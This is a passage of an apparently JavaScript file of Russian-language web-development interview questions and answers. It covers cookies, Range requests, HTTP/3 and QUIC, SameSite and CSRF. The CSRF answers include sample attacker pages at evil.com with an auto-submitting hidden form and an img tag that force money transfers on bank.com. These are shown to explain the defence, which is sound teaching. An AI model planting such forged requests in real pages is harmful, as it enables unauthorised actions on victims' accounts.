Secure)</li></ul><p><strong>Типы cookies по назначению:</strong></p><p><strong>1. Session cookies:</strong></p><ul><li>Идентификация пользовательской сессии</li><li>Обычно HttpOnly и Secure</li></ul><p><strong>2. Persistent cookies:</strong></p><ul><li>\"Запомнить меня\" функциональность</li><li>Имеют Expires или Max-Age</li></ul><p><strong>3. Third-party cookies:</strong></p><ul><li>Устанавливаются другими доменами (реклама, аналитика)</li><li>Часто блокируются браузерами</li></ul><p><strong>Ограничения cookies:</strong></p><ul><li>Размер: обычно 4KB на cookie</li><li>Количество: ~50 cookies на домен, ~3000 total</li><li>Автоматически отправляются с каждым запросом (overhead)</li></ul><p><strong>Проблемы безопасности:</strong></p><p><strong>1. CSRF (Cross-Site Request Forgery):</strong></p><ul><li>Злонамеренный сайт использует ваши cookies</li><li>Решение: SameSite, CSRF токены</li></ul><p><strong>2. XSS (Cross-Site Scripting):</strong></p><ul><li>JavaScript может украсть cookies</li><li>Решение: HttpOnly, Content Security Policy</li></ul><p><strong>3. Session hijacking:</strong></p><ul><li>Перехват session cookie</li><li>Решение: Secure, HttpOnly, короткие сессии, регенерация session ID</li></ul><p><strong>Best practices:</strong></p><ul><li>Всегда использовать Secure для чувствительных данных</li><li>HttpOnly для session cookies</li><li>SameSite=Lax минимум, Strict для критичных операций</li><li>Минимальный срок жизни</li><li>Не хранить конфиденциальные данные в cookies</li><li>Регулярная регенерация session ID</li></ul><p><strong>Альтернативы cookies:</strong></p><ul><li>localStorage/sessionStorage — но доступны для JavaScript</li><li>IndexedDB — для больших объемов данных</li><li>JWT токены в Authorization header — не отправляются автоматически</li></ul>",
    difficulty: 'middle',
    tags: ['cookies', 'безопасность', 'SameSite', 'HttpOnly', 'Secure']
  },
  {
    id: 14,
    question: "Что такое Range requests и как они используются в HTTP?",
    answer: "<p><strong>Range requests</strong> — это механизм HTTP, позволяющий запрашивать только часть ресурса вместо всего файла целиком.</p><p><strong>Зачем нужны Range requests:</strong></p><ul><li>Возобновление прерванной загрузки</li><li>Потоковая передача видео/аудио</li><li>Параллельная загрузка частей файла</li><li>Загрузка только нужного фрагмента большого файла</li><li>Экономия трафика</li></ul><p><strong>Как работает Range request:</strong></p><p><strong>1. Проверка поддержки:</strong></p><ul><li>Клиент отправляет HEAD запрос</li><li>Сервер отвечает заголовком Accept-Ranges: bytes</li><li>Если Accept-Ranges: none — range requests не поддерживаются</li></ul><p><strong>2. Запрос диапазона:</strong></p><ul><li>Клиент отправляет GET с заголовком Range</li><li>Range: bytes=0-1023 — первые 1024 байта</li><li>Range: bytes=1024-2047 — следующие 1024 байта</li><li>Range: bytes=1024- — от 1024 байта до конца</li><li>Range: bytes=-1024 — последние 1024 байта</li></ul><p><strong>3. Ответ сервера:</strong></p><ul><li>Статус 206 Partial Content</li><li>Content-Range: bytes 0-1023/5000 (диапазон/общий размер)</li><li>Content-Length: 1024 (размер этой части)</li><li>Тело ответа содержит запрошенные байты</li></ul><p><strong>Множественные диапазоны:</strong></p><ul><li>Range: bytes=0-100, 200-300</li><li>Ответ в формате multipart/byteranges</li><li>Каждая часть с собственными заголовками</li></ul><p><strong>Практические применения:</strong></p><p><strong>1. Возобновление загрузки:</strong></p><ol><li>Загрузка началась, загружено 5000 байт</li><li>Соединение прервалось</li><li>Клиент запрашивает Range: bytes=5000-</li><li>Загрузка продолжается с того же места</li></ol><p><strong>2. Видео стриминг:</strong></p><ul><li>Браузер загружает видео частями</li><li>При перемотке запрашивает нужный диапазон</li><li>Не нужно загружать весь файл</li></ul><p><strong>3. PDF viewer:</strong></p><ul><li>Загрузка только видимых страниц</li><li>Остальные загружаются по требованию</li></ul><p><strong>4. Параллельная загрузка:</strong></p><ul><li>Download managers разбивают файл на части</li><li>Каждая часть загружается параллельно</li><li>Увеличение скорости загрузки</li></ul><p><strong>Условные Range requests:</strong></p><ul><li>If-Range заголовок для проверки изменений</li><li>If-Range: \"etag-value\" или дата Last-Modified</li><li>Если файл изменился — возвращает весь файл (200)</li><li>Если нет — возвращает диапазон (206)</li></ul><p><strong>Заголовки для Range requests:</strong></p><p><strong>Запрос:</strong></p><ul><li>Range: bytes=start-end</li><li>If-Range: ETag или Last-Modified</li></ul><p><strong>Ответ:</strong></p><ul><li>Accept-Ranges: bytes (или none)</li><li>Content-Range: bytes start-end/total</li><li>Content-Length: size</li><li>ETag: \"version\"</li></ul><p><strong>Возможные ответы:</strong></p><ul><li><strong>206 Partial Content</strong> — успешная частичная отдача</li><li><strong>200 OK</strong> — если If-Range не совпал или не поддерживается</li><li><strong>416 Range Not Satisfiable</strong> — запрошенный диапазон вне границ</li></ul><p><strong>Ограничения и проблемы:</strong></p><ul><li>Не все серверы поддерживают Range requests</li><li>Динамический контент сложно отдавать по частям</li><li>Нужна правильная настройка кэширования</li><li>ETag/Last-Modified важны для консистентности</li></ul><p><strong>Best practices:</strong></p><ul><li>Всегда возвращать Accept-Ranges для статических файлов</li><li>Использовать ETag для динамического контента</li><li>Корректно обрабатывать некорректные диапазоны</li><li>Поддерживать If-Range для оптимизации</li></ul>",
    difficulty: 'senior',
    tags: ['Range requests', 'частичная загрузка', 'стриминг', 'производительность']
  },
  {
    id: 15,
    question: "Что такое HTTP/3 и QUIC, какие проблемы они решают?",
    answer: "<p><strong>HTTP/3</strong> — это новая версия HTTP протокола, работающая поверх QUIC вместо TCP.</p><p><strong>QUIC (Quick UDP Internet Connections):</strong></p><ul><li>Транспортный протокол от Google, теперь стандартизован IETF</li><li>Работает поверх UDP вместо TCP</li><li>Встроенное шифрование (TLS 1.3)</li><li>Мультиплексирование на уровне транспорта</li></ul><p><strong>Проблемы HTTP/2, которые решает HTTP/3:</strong></p><p><strong>1. TCP Head-of-Line Blocking:</strong></p><ul><li>В HTTP/2 потерянный TCP пакет блокирует все потоки</li><li>TCP гарантирует порядок доставки на уровне протокола</li><li>QUIC решает: независимые потоки на уровне транспорта</li><li>Потеря пакета влияет только на один поток</li></ul><p><strong>2. Медленное установление соединения:</strong></p><ul><li>TCP + TLS требуют 2-3 RTT для начала передачи данных</li><li>TCP handshake (1 RTT) + TLS handshake (1-2 RTT)</li><li>QUIC: 0-RTT или 1-RTT для установки соединения</li><li>Встроенное шифрование ускоряет процесс</li></ul><p><strong>3. Connection migration:</strong></p><ul><li>TCP соединение привязано к IP адресу и порту</li><li>Смена сети (WiFi на LTE) = новое соединение</li><li>QUIC: Connection ID не зависит от IP</li><li>Плавное переключение между сетями без разрыва</li></ul><p><strong>Ключевые особенности HTTP/3:</strong></p><p><strong>1. Мультиплексирование без блокировки:</strong></p><ul><li>Истинное мультиплексирование на транспортном уровне</li><li>Потоки полностью независимы</li><li>Нет head-of-line blocking</li></ul><p><strong>2. Быстрое установление соединения:</strong></p><ul><li>0-RTT для повторных соединений (resume)</li><li>1-RTT для новых соединений</li><li>Данные могут отправляться в первом пакете</li></ul><p><strong>3. Встроенное шифрование:</strong></p><ul><li>TLS 1.3 интегрирован в QUIC</li><li>Нельзя использовать QUIC без шифрования</li><li>Защита метаданных соединения</li></ul><p><strong>4. Улучшенная обработка потерь:</strong></p><ul><li>Более точное определение потерь пакетов</li><li>Быстрое восстановление</li><li>Лучшая работа на нестабильных сетях</li></ul><p><strong>5. Гибкость:</strong></p><ul><li>Протокол реализован в пространстве пользователя</li><li>Обновления без изменения ОС</li><li>Быстрая эволюция протокола</li></ul><p><strong>Преимущества для пользователей:</strong></p><ul><li>Быстрее загрузка страниц, особенно на мобильных сетях</li><li>Лучше работа при потере пакетов</li><li>Плавное переключение между сетями</li><li>Меньше латентности для первого запроса</li></ul><p><strong>UDP и проблемы:</strong></p><p><strong>Почему UDP:</strong></p><ul><li>TCP \"зашит\" в ОС и его сложно изменять</li><li>UDP — простой протокол, гибкая основа</li><li>Можно реализовать нужную функциональность поверх</li></ul><p><strong>Проблемы UDP:</strong></p><ul><li>Некоторые сети блокируют UDP трафик</li><li>Firewall и middlebox могут не пропускать</li><li>Необходим fallback на HTTP/2</li></ul><p><strong>Поддержка и внедрение:</strong></p><ul><li>Уже используется Google, Facebook, Cloudflare</li><li>Поддерживается современными браузерами</li><li>Постепенное внедрение с fallback на HTTP/2</li></ul><p><strong>Особенности разработки:</strong></p><ul><li>Прозрачно для приложений</li><li>Поддержка на уровне сервера и CDN</li><li>Браузер автоматически выбирает протокол</li><li>Alt-Svc заголовок для обнаружения HTTP/3</li></ul><p><strong>Когда HTTP/3 особенно эффективен:</strong></p><ul><li>Мобильные сети с потерями пакетов</li><li>Частая смена сетей (WiFi ↔ LTE)</li><li>Высоколатентные соединения</li><li>Множество параллельных запросов</li></ul><p><strong>Ограничения:</strong></p><ul><li>Потребление CPU (шифрование/дешифрование в userspace)</li><li>Не везде поддерживается UDP</li><li>Новый протокол, возможны проблемы совместимости</li></ul>",
    difficulty: 'senior',
    tags: ['HTTP/3', 'QUIC', 'UDP', 'производительность', 'современные протоколы']
  },
  {
    id: 16,
    question: "Что такое cookie и для чего они используются в веб-разработке?",
    answer: "<p><strong>Cookie (куки)</strong> — это небольшие текстовые данные, которые веб-сайт сохраняет в браузере пользователя для последующего использования.</p><p><strong>Основное назначение cookies:</strong></p><p><strong>1. Управление сессиями:</strong></p><ul><li>Хранение идентификатора сессии пользователя</li><li>Поддержка аутентификации между запросами</li><li>\"Запомнить меня\" функциональность</li><li>Сохранение состояния корзины покупок</li></ul><p><strong>2. Персонализация:</strong></p><ul><li>Сохранение пользовательских настроек (язык, тема)</li><li>Запоминание предпочтений пользователя</li><li>Настройки отображения контента</li></ul><p><strong>3. Отслеживание и аналитика:</strong></p><ul><li>Сбор статистики посещений</li><li>Анализ поведения пользователей</li><li>A/B тестирование</li><li>Рекламные цели</li></ul><p><strong>Как работают cookies:</strong></p><ol><li>Сервер отправляет cookie в заголовке Set-Cookie</li><li>Браузер сохраняет cookie локально</li><li>При следующих запросах браузер автоматически отправляет cookie обратно</li><li>Сервер читает cookie и использует данные</li></ol><p><strong>Ключевые характеристики:</strong></p><ul><li>Автоматически отправляются с каждым запросом к домену</li><li>Ограничены по размеру (обычно 4KB)</li><li>Имеют срок жизни (session или persistent)</li><li>Привязаны к домену и пути</li><li>Видимы как серверу, так и клиенту (если не HttpOnly)</li></ul><p><strong>Типы cookies:</strong></p><ul><li><strong>Session cookies</strong> — удаляются при закрытии браузера</li><li><strong>Persistent cookies</strong> — хранятся до указанной даты</li><li><strong>First-party cookies</strong> — устанавливаются текущим сайтом</li><li><strong>Third-party cookies</strong> — устанавливаются другими доменами (реклама, аналитика)</li></ul>",
    difficulty: 'junior',
    tags: ['cookie', 'основы', 'сессии', 'веб']
  },
  {
    id: 17,
    question: "Какие данные можно и нельзя хранить в cookie?",
    answer: "<p><strong>Что МОЖНО хранить в cookies:</strong></p><p><strong>1. Идентификаторы сессий:</strong></p><ul><li>Session ID для авторизованных пользователей</li><li>Токены аутентификации (с осторожностью)</li><li>Уникальные идентификаторы пользователя</li></ul><p><strong>2. Пользовательские настройки:</strong></p><ul><li>Выбранный язык интерфейса</li><li>Тема оформления (светлая/темная)</li><li>Размер шрифта</li><li>Настройки отображения</li></ul><p><strong>3. Состояние UI:</strong></p><ul><li>Свернутые/развернутые секции</li><li>Выбранные вкладки</li><li>Параметры сортировки и фильтрации</li></ul><p><strong>4. Аналитическая информация:</strong></p><ul><li>Идентификатор для отслеживания</li><li>UTM метки</li><li>Источник перехода</li></ul><p><strong>5. Функциональные данные:</strong></p><ul><li>ID корзины покупок</li><li>Флаг принятия cookies</li><li>Временные токены (CSRF)</li></ul><p><strong>Что НЕЛЬЗЯ хранить в cookies:</strong></p><p><strong>1. Конфиденциальная информация:</strong></p><ul><li>❌ Пароли в любом виде</li><li>❌ Номера кредитных карт</li><li>❌ Паспортные данные</li><li>❌ Медицинская информация</li><li>❌ Финансовые данные</li></ul><p><strong>2. Персональные данные:</strong></p><ul><li>❌ Полные имена и адреса</li><li>❌ Номера телефонов</li><li>❌ Email адреса (лучше хранить ID)</li><li>❌ Даты рождения</li></ul><p><strong>3. Большие объемы данных:</strong></p><ul><li>❌ Списки товаров (используйте localStorage или сервер)</li><li>❌ Кэш данных приложения</li><li>❌ Файлы или изображения</li><li>Причина: ограничение 4KB, отправляются с каждым запросом</li></ul><p><strong>4. Критичные для безопасности данные:</strong></p><ul><li>❌ API ключи</li><li>❌ Секретные токены без защиты</li><li>❌ Приватные ключи</li></ul><p><strong>Рекомендации по безопасности:</strong></p><ul><li>Храните только идентификаторы, а не сами данные</li><li>Используйте HttpOnly для защиты от XSS</li><li>Используйте Secure для HTTPS-only передачи</li><li>Применяйте SameSite для защиты от CSRF</li><li>Шифруйте чувствительные данные перед сохранением</li><li>Устанавливайте минимальный срок жизни</li></ul><p><strong>Best practices:</strong></p><ul><li>Храните reference/ID вместо actual data</li><li>Реальные данные должны быть на сервере</li><li>Cookie — для идентификации и связывания с серверными данными</li><li>Для больших данных используйте localStorage/IndexedDB</li><li>Всегда валидируйте данные из cookies на сервере</li></ul>",
    difficulty: 'junior',
    tags: ['cookie', 'безопасность', 'данные', 'best practices']
  },
  {
    id: 18,
    question: "Как создать и установить cookie на стороне сервера?",
    answer: "<p><strong>Установка cookie на сервере</strong> происходит через HTTP заголовок Set-Cookie в ответе сервера.</p><p><strong>Базовый синтаксис Set-Cookie:</strong></p><pre><code>Set-Cookie: name=value</code></pre><p><strong>Примеры на разных серверных технологиях:</strong></p><p><strong>Node.js (Express):</strong></p><pre><code>// Простая cookie\nres.cookie('username', 'john', { maxAge: 900000 });\n\n// С параметрами безопасности\nres.cookie('sessionId', 'abc123', {\n  maxAge: 24 * 60 * 60 * 1000, // 24 часа\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  path: '/',\n  domain: 'example.com'\n});\n\n// Или через заголовок напрямую\nres.setHeader('Set-Cookie', 'token=xyz; HttpOnly; Secure; SameSite=Lax');</code></pre><p><strong>Python (Flask):</strong></p><pre><code>from flask import make_response\n\n@app.route('/login')\ndef login():\n    resp = make_response(render_template('home.html'))\n    resp.set_cookie(\n        'session_id',\n        'abc123',\n        max_age=3600,\n        secure=True,\n        httponly=True,\n        samesite='Lax'\n    )\n    return resp</code></pre><p><strong>PHP:</strong></p><pre><code>// Простая установка\nsetcookie('username', 'john', time() + 3600);\n\n// С параметрами\nsetcookie(\n    'session_id',\n    'abc123',\n    [\n        'expires' => time() + 86400,\n        'path' => '/',\n        'domain' => 'example.com',\n        'secure' => true,\n        'httponly' => true,\n        'samesite' => 'Lax'\n    ]\n);</code></pre><p><strong>Множественные cookies:</strong></p><ul><li>Можно установить несколько cookies в одном ответе</li><li>Каждая cookie — отдельный заголовок Set-Cookie</li></ul><pre><code>// Express\nres.cookie('session', 'abc123');\nres.cookie('preferences', 'dark-theme');\nres.cookie('language', 'ru');</code></pre><p><strong>Чтение cookies на сервере:</strong></p><p><strong>Node.js (Express с cookie-parser):</strong></p><pre><code>const cookieParser = require('cookie-parser');\napp.use(cookieParser());\n\napp.get('/profile', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  const username = req.cookies.username;\n  // использование cookies\n});</code></pre><p><strong>Удаление cookie на сервере:</strong></p><pre><code>// Express - установить прошедшую дату\nres.cookie('sessionId', '', { maxAge: 0 });\n// или\nres.clearCookie('sessionId');\n\n// PHP\nsetcookie('sessionId', '', time() - 3600);</code></pre><p><strong>Важные моменты:</strong></p><ul><li>Set-Cookie должен быть отправлен ДО любого вывода контента</li><li>Можно установить несколько cookies одновременно</li><li>Браузер автоматически сохранит и будет отправлять cookie</li><li>Всегда проверяйте наличие cookie перед использованием</li><li>Валидируйте данные из cookies на сервере</li></ul>",
    difficulty: 'junior',
    tags: ['cookie', 'сервер', 'Set-Cookie', 'backend']
  },
  {
    id: 19,
    question: "Как создать и управлять cookie на стороне клиента с помощью JavaScript?",
    answer: "<p><strong>Работа с cookies через JavaScript</strong> осуществляется с помощью document.cookie API.</p><p><strong>Создание/установка cookie:</strong></p><pre><code>// Простая cookie\ndocument.cookie = \"username=john\";\n\n// С датой истечения\nconst expires = new Date();\nexpires.setDate(expires.getDate() + 7); // +7 дней\ndocument.cookie = `token=abc123; expires=${expires.toUTCString()}`;\n\n// С max-age (в секундах)\ndocument.cookie = \"sessionId=xyz; max-age=3600\"; // 1 час\n\n// С путем и доменом\ndocument.cookie = \"theme=dark; path=/; domain=example.com\";\n\n// Secure cookie (только HTTPS)\ndocument.cookie = \"authToken=secret; secure\";\n\n// С SameSite\ndocument.cookie = \"userId=123; SameSite=Lax\";</code></pre><p><strong>Вспомогательная функция для установки:</strong></p><pre><code>function setCookie(name, value, days) {\n  let expires = \"\";\n  if (days) {\n    const date = new Date();\n    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));\n    expires = \"; expires=\" + date.toUTCString();\n  }\n  document.cookie = name + \"=\" + (value || \"\") + expires + \"; path=/\";\n}\n\n// Использование\nsetCookie('username', 'john', 7); // на 7 дней\nsetCookie('theme', 'dark', 365); // на год</code></pre><p><strong>Чтение cookies:</strong></p><pre><code>// document.cookie возвращает ВСЕ cookies как строку\nconsole.log(document.cookie);\n// \"username=john; theme=dark; sessionId=abc123\"\n\n// Функция для получения конкретной cookie\nfunction getCookie(name) {\n  const nameEQ = name + \"=\";\n  const cookies = document.cookie.split(';');\n  \n  for (let i = 0; i < cookies.length; i++) {\n    let cookie = cookies[i].trim();\n    if (cookie.indexOf(nameEQ) === 0) {\n      return cookie.substring(nameEQ.length);\n    }\n  }\n  return null;\n}\n\n// Использование\nconst username = getCookie('username'); // \"john\"\nconst theme = getCookie('theme'); // \"dark\"</code></pre><p><strong>Удаление cookie:</strong></p><pre><code>// Установить прошедшую дату\ndocument.cookie = \"username=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/\";\n\n// Функция для удаления\nfunction deleteCookie(name) {\n  document.cookie = name + \"=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/\";\n}\n\n// Использование\ndeleteCookie('username');</code></pre><p><strong>Проверка существования cookie:</strong></p><pre><code>function cookieExists(name) {\n  return getCookie(name) !== null;\n}\n\nif (cookieExists('sessionId')) {\n  console.log('Пользователь авторизован');\n}</code></pre><p><strong>Современный подход с классом:</strong></p><pre><code>class CookieManager {\n  static set(name, value, days = 7, options = {}) {\n    let cookieString = `${name}=${encodeURIComponent(value)}`;\n    \n    if (days) {\n      const date = new Date();\n      date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));\n      cookieString += `; expires=${date.toUTCString()}`;\n    }\n    \n    cookieString += `; path=${options.path || '/'}`;\n    \n    if (options.domain) cookieString += `; domain=${options.domain}`;\n    if (options.secure) cookieString += '; secure';\n    if (options.sameSite) cookieString += `; SameSite=${options.sameSite}`;\n    \n    document.cookie = cookieString;\n  }\n  \n  static get(name) {\n    const nameEQ = name + \"=\";\n    const cookies = document.cookie.split(';');\n    \n    for (let cookie of cookies) {\n      cookie = cookie.trim();\n      if (cookie.indexOf(nameEQ) === 0) {\n        return decodeURIComponent(cookie.substring(nameEQ.length));\n      }\n    }\n    return null;\n  }\n  \n  static delete(name, path = '/') {\n    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=${path}`;\n  }\n  \n  static getAll() {\n    return document.cookie.split(';').reduce((cookies, cookie) => {\n      const [name, value] = cookie.trim().split('=');\n      cookies[name] = decodeURIComponent(value);\n      return cookies;\n    }, {});\n  }\n}\n\n// Использование\nCookieManager.set('user', 'john', 30, { secure: true, sameSite: 'Strict' });\nconst user = CookieManager.get('user');\nCookieManager.delete('user');\nconst allCookies = CookieManager.getAll();</code></pre><p><strong>Важные ограничения:</strong></p><ul><li>HttpOnly cookies недоступны через JavaScript (защита от XSS)</li><li>document.cookie возвращает строку, а не объект</li><li>Нужно вручную парсить cookies</li><li>Нельзя прочитать атрибуты cookies (expires, httpOnly и т.д.)</li><li>Специальные символы нужно кодировать (encodeURIComponent)</li></ul>",
    difficulty: 'junior',
    tags: ['cookie', 'JavaScript', 'document.cookie', 'клиент']
  },
  {
    id: 20,
    question: "Какие атрибуты cookie существуют и как они влияют на поведение?",
    answer: "<p><strong>Атрибуты cookies</strong> определяют их поведение, безопасность и область действия.</p><p><strong>1. Expires / Max-Age (время жизни):</strong></p><p><strong>Expires:</strong></p><ul><li>Указывает точную дату/время истечения</li><li>Формат: Expires=Wed, 21 Oct 2025 07:28:00 GMT</li><li>После этой даты cookie удаляется</li><li>Если не указан — session cookie (удаляется при закрытии браузера)</li></ul><p><strong>Max-Age:</strong></p><ul><li>Указывает время жизни в секундах</li><li>Max-Age=3600 означает 1 час</li><li>Max-Age=0 или отрицательное значение — удаляет cookie</li><li>Имеет приоритет над Expires</li></ul><pre><code>// Session cookie (нет expires/max-age)\nSet-Cookie: session=abc123\n\n// С expires\nSet-Cookie: user=john; Expires=Wed, 21 Oct 2025 07:28:00 GMT\n\n// С max-age\nSet-Cookie: token=xyz; Max-Age=86400 // 24 часа</code></pre><p><strong>2. Domain (область домена):</strong></p><ul><li>Определяет для каких доменов доступна cookie</li><li>По умолчанию — только текущий домен (без поддоменов)</li><li>Domain=example.com — доступна для example.com и всех поддоменов</li><li>Нельзя установить cookie для чужого домена</li><li>Нельзя установить для top-level домена (.com, .ru)</li></ul><pre><code>// Только для app.example.com\nSet-Cookie: token=abc; Domain=app.example.com\n\n// Для example.com и всех поддоменов (api.example.com, www.example.com)\nSet-Cookie: user=john; Domain=example.com</code></pre><p><strong>3. Path (область пути):</strong></p><ul><li>Определяет для каких URL путей доступна cookie</li><li>Cookie отправляется только для указанного пути и его подпутей</li><li>Path=/ — для всего сайта (по умолчанию текущий путь)</li><li>Path=/admin — только для /admin и /admin/*</li></ul><pre><code>// Для всего сайта\nSet-Cookie: theme=dark; Path=/\n\n// Только для админ-панели\nSet-Cookie: adminToken=xyz; Path=/admin\n\n// Для API\nSet-Cookie: apiKey=abc; Path=/api</code></pre><p><strong>4. Secure (только HTTPS):</strong></p><ul><li>Cookie передается только через HTTPS</li><li>Защита от перехвата в незашифрованном соединении</li><li>Обязателен для конфиденциальных данных</li><li>На localhost работает и с HTTP</li></ul><pre><code>Set-Cookie: authToken=secret; Secure</code></pre><p><strong>5. HttpOnly (недоступна JavaScript):</strong></p><ul><li>Cookie недоступна через document.cookie</li><li>Защита от XSS атак</li><li>JavaScript не может прочитать или изменить</li><li>Доступна только серверу</li><li>Критично для session cookies</li></ul><pre><code>Set-Cookie: sessionId=abc123; HttpOnly</code></pre><p><strong>6. SameSite (защита CSRF):</strong></p><ul><li>Контролирует отправку в cross-site запросах</li><li>Три значения: Strict, Lax, None</li></ul><p><strong>SameSite=Strict:</strong></p><ul><li>Самая строгая защита</li><li>Cookie отправляется ТОЛЬКО для same-site запросов</li><li>Не отправляется даже при переходе по ссылке с другого сайта</li><li>Подходит для критичных операций</li></ul><p><strong>SameSite=Lax (по умолчанию):</strong></p><ul><li>Cookie отправляется для top-level navigation (GET)</li><li>Не отправляется для POST, iframe, fetch, img</li><li>Баланс между безопасностью и удобством</li><li>Защищает от большинства CSRF атак</li></ul><p><strong>SameSite=None:</strong></p><ul><li>Cookie отправляется всегда (cross-site тоже)</li><li>Требует обязательного атрибута Secure</li><li>Нужно для iframe интеграций, OAuth</li></ul><pre><code>// Максимальная защита\nSet-Cookie: sessionId=abc; SameSite=Strict; Secure; HttpOnly\n\n// Для cross-site использования\nSet-Cookie: widget=xyz; SameSite=None; Secure</code></pre><p><strong>Комбинирование атрибутов:</strong></p><pre><code>// Идеальная security cookie\nSet-Cookie: sessionId=abc123; \n  HttpOnly; \n  Secure; \n  SameSite=Strict; \n  Max-Age=3600; \n  Path=/; \n  Domain=example.com</code></pre><p><strong>Best practices:</strong></p><ul><li>Всегда используйте Secure для production</li><li>HttpOnly для всех session cookies</li><li>SameSite=Lax минимум, Strict для чувствительных операций</li><li>Минимальный Max-Age для security cookies</li><li>Path=/ для общедоступных cookies</li><li>Не используйте широкие Domain без необходимости</li></ul>",
    difficulty: 'middle',
    tags: ['cookie', 'атрибуты', 'Secure', 'HttpOnly', 'SameSite']
  },
  {
    id: 21,
    question: "Что такое атрибут SameSite и зачем он нужен для безопасности cookies?",
    answer: "<p><strong>SameSite</strong> — это атрибут cookie, который контролирует отправку cookies в cross-site запросах для защиты от CSRF атак.</p><p><strong>Проблема без SameSite:</strong></p><ul><li>Браузер автоматически отправляет cookies с ЛЮБЫМ запросом к домену</li><li>Злонамеренный сайт evil.com может отправить запрос к bank.com</li><li>Браузер приложит ваши cookies от bank.com</li><li>Сервер не различит легитимный и атакующий запрос</li><li>Результат: CSRF (Cross-Site Request Forgery) атака</li></ul><p><strong>Три значения SameSite:</strong></p><p><strong>1. SameSite=Strict (самая строгая защита):</strong></p><ul><li>Cookie отправляется ТОЛЬКО для same-site запросов</li><li>Same-site = тот же домен, что в адресной строке браузера</li><li>Не отправляется даже при клике по ссылке с другого сайта</li></ul><pre><code>Set-Cookie: sessionId=abc; SameSite=Strict\n\n// Примеры:\n// ✅ Отправится: пользователь на site.com кликает ссылку на site.com\n// ❌ НЕ отправится: пользователь на google.com кликает ссылку на site.com\n// ❌ НЕ отправится: POST с other-site.com на site.com\n// ❌ НЕ отправится: iframe с site.com на other-site.com</code></pre><p><strong>Когда использовать Strict:</strong></p><ul><li>Критичные операции (платежи, изменение пароля)</li><li>Административные панели</li><li>Внутренние системы без внешних ссылок</li></ul><p><strong>Проблема Strict:</strong></p><ul><li>Плохой UX — пользователь переходит по ссылке и видит \"не авторизован\"</li><li>Нужен повторный логин после перехода с внешнего сайта</li></ul><p><strong>2. SameSite=Lax (по умолчанию в современных браузерах):</strong></p><ul><li>Cookie отправляется для \"безопасной\" top-level navigation</li><li>Top-level = изменяется URL в адресной строке</li><li>Только для GET запросов</li></ul><pre><code>Set-Cookie: sessionId=abc; SameSite=Lax\n\n// Примеры:\n// ✅ Отправится: клик по ссылке (GET)\n// ✅ Отправится: window.location = \"...\" (GET)\n// ✅ Отправится: форма с method=\"GET\"\n// ❌ НЕ отправится: форма с method=\"POST\"\n// ❌ НЕ отправится: fetch/XHR запросы\n// ❌ НЕ отправится: iframe\n// ❌ НЕ отправится: img src</code></pre><p><strong>Когда использовать Lax:</strong></p><ul><li>Обычная аутентификация пользователей</li><li>Большинство веб-приложений</li><li>Баланс между безопасностью и удобством</li><li>Защищает от 99% CSRF атак</li></ul><p><strong>3. SameSite=None (без ограничений):</strong></p><ul><li>Cookie отправляется ВСЕГДА, включая cross-site</li><li>Требует обязательного атрибута Secure (только HTTPS)</li><li>Как работало до введения SameSite</li></ul><pre><code>Set-Cookie: widget=xyz; SameSite=None; Secure\n\n// Отправляется в любых сценариях</code></pre><p><strong>Когда использовать None:</strong></p><ul><li>Встраиваемые виджеты (например, комментарии, чаты)</li><li>OAuth аутентификация</li><li>iframe интеграции</li><li>Cross-site API запросы с credentials</li><li>Third-party cookies</li></ul><p><strong>Практический пример CSRF атаки без SameSite:</strong></p><pre><code>// На сайте evil.com:\n<form action=\"https://bank.com/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker\">\n  <input name=\"amount\" value=\"1000\">\n</form>\n<script>\n  document.forms[0].submit(); // Автоматически отправляет\n</script>\n\n// Без SameSite: браузер приложит cookie от bank.com\n// Результат: деньги переведены\n\n// С SameSite=Lax или Strict: cookie не отправится\n// Результат: запрос не авторизован, атака провалилась</code></pre><p><strong>Как SameSite защищает:</strong></p><ol><li>Злонамеренный сайт не может использовать ваши cookies</li><li>POST/PUT/DELETE запросы cross-site блокируются</li><li>Защита работает автоматически в браузере</li><li>Не требует изменений в коде приложения</li></ol><p><strong>Совместимость и fallback:</strong></p><ul><li>Старые браузеры не поддерживают SameSite</li><li>Нужны дополнительные методы защиты (CSRF токены)</li><li>Современные браузеры используют Lax по умолчанию</li></ul><p><strong>Best practices:</strong></p><ul><li>По умолчанию используйте SameSite=Lax</li><li>Strict для особо критичных операций</li><li>None только когда действительно нужен cross-site доступ</li><li>Всегда Secure вместе с SameSite=None</li><li>Комбинируйте с другими методами защиты (CSRF токены, валидация Origin)</li></ul><p><strong>Рекомендуемая конфигурация:</strong></p><pre><code>// Session cookie\nSet-Cookie: sessionId=abc123; \n  HttpOnly; \n  Secure; \n  SameSite=Lax; \n  Max-Age=3600\n\n// Для критичных операций\nSet-Cookie: csrfToken=xyz; \n  Secure; \n  SameSite=Strict\n\n// Для cross-site интеграций\nSet-Cookie: widget=data; \n  SameSite=None; \n  Secure</code></pre>",
    difficulty: 'middle',
    tags: ['cookie', 'SameSite', 'CSRF', 'безопасность', 'защита']
  },
  {
    id: 22,
    question: "Что такое CSRF атака и как cookies участвуют в ней? Как защититься?",
    answer: "<p><strong>CSRF (Cross-Site Request Forgery)</strong> — это атака, при которой злоумышленник заставляет браузер жертвы отправить запрос на другой сайт, используя cookies жертвы.</p><p><strong>Как работает CSRF атака:</strong></p><ol><li>Пользователь авторизован на сайте bank.com</li><li>Браузер хранит session cookie от bank.com</li><li>Пользователь переходит на злонамеренный сайт evil.com</li><li>evil.com отправляет скрытый запрос к bank.com</li><li>Браузер автоматически прикрепляет cookies от bank.com</li><li>Сервер bank.com думает, что это легитимный запрос</li><li>Действие выполняется от имени жертвы</li></ol><p><strong>Пример CSRF атаки:</strong></p><pre><code>// Пользователь залогинен на bank.com, есть cookie:\n// Set-Cookie: sessionId=user123; \n\n// На злонамеренном сайте evil.com:\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000\">\n// или\n<form action=\"https://bank.com/transfer\" method=\"POST\" id=\"hack\">\n  <input name=\"to\" value=\"attacker\">\n  <input name=\"amount\" value=\"1000\">\n</form>\n<script>\n  document.getElementById('hack').submit();\n</script>\n\n// Браузер автоматически отправит cookie sessionId=user123\n// Сервер 